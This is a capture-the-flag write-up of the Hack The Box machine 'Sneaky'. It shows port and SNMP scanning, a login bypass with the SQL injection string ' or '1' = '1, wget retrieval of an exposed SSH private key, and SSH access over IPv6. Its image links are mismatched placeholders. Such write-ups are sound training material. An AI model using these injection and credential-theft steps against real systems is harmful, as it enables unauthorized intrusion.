# Sneaky
#### 10.10.10.20

```{r, engine='bash', count_lines}
nmap 10.10.10.20

PORT   STATE SERVICE
80/tcp open  http
```

The website shows that its under construction

![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/is_vuln_if.png "Is vuln if")


Dirbuster Initiate!

![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/is_vuln_if.png "Is vuln if")

Well ofcourse, its under **dev**elopment

We are greeted by a Login screen

![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/is_vuln_if.png "Is vuln if")


Whats the autoresponse when we see a poorly made login page ?

Yes **' or '1' = '1**

Simple sql injection. Seems legit

After the login we get sjuicy stuff
![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/is_vuln_if.png "Is vuln if")

Lets make a note of the info:

- name: admin
- name: thrasvilous
- RSA Private key
- We are No-one

Lets wget the RSA key

And because its a Private SSH key, we change its perms

```
root@kali:~/Hackthebox/Sneaky# wget http://10.10.10.20/dev/sshkeyforadministratordifficulttimes
--2017-11-07 17:24:48--  http://10.10.10.20/dev/sshkeyforadministratordifficulttimes
Connecting to 10.10.10.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1675 (1.6K)
Saving to: ‘sshkeyforadministratordifficulttimes’

sshkeyforadministratordifficulttimes  100%[=======================================================================>]   1.64K  --.-KB/s    in 0s      

2017-11-07 17:24:48 (120 MB/s) - ‘sshkeyforadministratordifficulttimes’ saved [1675/1675]

root@kali:~/Hackthebox/Sneaky# mv sshkeyforadministratordifficulttimes adminssh.key

root@kali:~/Hackthebox/Sneaky# chmod 600 adminssh.key 

```

**BUT!!!**

We dont have a port 22 (ssh) open on this box. Maybe it was setup on a different port.

Lets nmap all the ports 

After spending millions of years completing the nmap we see that there is no other port open.

![Alt test](https://media.giphy.com/media/l46CbAuxFk2Cz0s2A/giphy.gif)


Hold up! we found something else though

Port 161

Investigate Further

We get shit tons of info

```
nmap -sS -sU -p 161 -T4 -A 10.10.10.20

161/udp open   snmp    SNMPv1 server; net-snmp SNMPv3 server (public)

snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 129.30 Kb sent, 129.30 Kb received
|   eth0
|     IP address: 10.10.10.20  Netmask: 255.255.255.0
|     MAC address: 00:50:56:aa:35:f3 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 45.08 Mb sent, 41.13 Mb received
| snmp-netstat: 
|   TCP  127.0.0.1:3306       0.0.0.0:0
|_  UDP  0.0.0.0:161          *:*


```
We are SURE that there is a ssh port open, but we cant find it here...

Maybe its ipv6

Let me check what ipv6 we get for the openvpn

```
inet 10.10.14.52  netmask 255.255.254.0  destination 10.10.14.52
inet6 dead:beef:2::1032  prefixlen 64  scopeid 0x0<global>
```

A wise gentelman from stack overflow helped us 
![Alt test](https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6/27693666#27693666)

A little bit or "Trying Harder" and knowing that our local prefix should be dead:beef we get something like this

```
dead:beef::250:56ff:feaa:815e (HAVE TO CHECK THIS)
```

lets try and connect to it via ssh and out key



**_shellz_**
